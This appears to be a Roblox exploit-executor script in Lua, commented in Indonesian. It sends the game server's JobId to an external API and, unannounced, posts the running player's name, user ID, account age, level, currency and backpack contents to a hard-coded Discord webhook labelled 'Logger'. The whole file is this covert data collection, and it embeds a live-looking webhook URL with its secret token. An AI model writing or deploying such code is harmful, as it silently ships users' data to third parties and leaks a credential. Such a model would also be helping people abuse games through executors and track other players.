local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Konfigurasi
local jobId = tostring(game.JobId)
local apiEndpoint = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local player = Players.LocalPlayer
local playerName = player.Name

-- Ambil fungsi http request yang tersedia dari executor
local httpRequest = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request))

if typeof(httpRequest) ~= "function" then
    warn("‚ùå Executor tidak mendukung http request!")
    return
end

-- Fungsi bantu untuk request dengan error handling
local function safeRequest(requestTable)
    local success, response = pcall(function()
        return httpRequest(requestTable)
    end)
    if not success then
        warn("‚ùå Error saat melakukan HTTP request:", response)
        return nil
    end
    return response
end

-- Fungsi untuk mendapatkan isi backpack
local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack tidak ditemukan" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    if #contents == 0 then
        return "Backpack kosong"
    else
        return table.concat(contents, ", ")
    end
end

-- Fungsi untuk mendapatkan data player dengan error handling
local function getPlayerData()
    local data = {}
    
    -- Coba dapatkan level
    pcall(function()
        data.level = player:FindFirstChild("Level") and player.Level.Value or "Tidak tersedia"
    end)
    
    -- Coba dapatkan currency
    pcall(function()
        if player:FindFirstChild("Data") and player.Data:FindFirstChild("Currency") then
            data.currency = player.Data.Currency.Value
        else
            data.currency = "Tidak tersedia"
        end
    end)
    
    -- Tambahkan data dasar
    data.userId = player.UserId
    data.accountAge = player.AccountAge
    
    return data
end

-- Kirim ke API
local jsonData = HttpService:JSONEncode({ instanceId = jobId })
local apiResponse = safeRequest({
    Url = apiEndpoint,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonData
})

if apiResponse and apiResponse.StatusCode == 200 then
    print("‚úÖ InstanceId berhasil dikirim ke API:", jobId)
else
    warn("‚ùå Gagal kirim ke API:", apiResponse and apiResponse.StatusCode or "Tidak ada respons")
end

-- Dapatkan data player dan backpack
local backpackContents = getBackpackContents()
local playerData = getPlayerData()

-- Format data player untuk webhook
local playerInfo = string.format(
    "UserID: %d\nAccount Age: %d hari\nLevel: %s\nCurrency: %s",
    playerData.userId,
    playerData.accountAge,
    playerData.level,
    playerData.currency
)

-- Kirim ke Discord Webhook
local embed = {
    ["username"] = "Logger",
    ["embeds"] = {{
        ["title"] = "üü¢ Script Dijalankan",
        ["description"] = string.format("**%s** menjalankan script\nüì° **JobId:** `%s`", playerName, jobId),
        ["color"] = 65280, -- Hijau
        ["timestamp"] = DateTime.now():ToIsoDate(),
        ["fields"] = {
            {
                ["name"] = "üéí Isi Backpack",
                ["value"] = backpackContents,
                ["inline"] = false
            },
            {
                ["name"] = "üë§ Data Player",
                ["value"] = playerInfo,
                ["inline"] = true
            }
        },
        ["footer"] = {
            ["text"] = "Logger System"
        }
    }}
}

local webhookResponse = safeRequest({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(embed)
})

if webhookResponse and webhookResponse.StatusCode == 200 then
    print("‚úÖ Webhook Discord terkirim!")
else
    warn("‚ùå Gagal kirim webhook:", webhookResponse and webhookResponse.StatusCode or "Tidak ada respons")
end
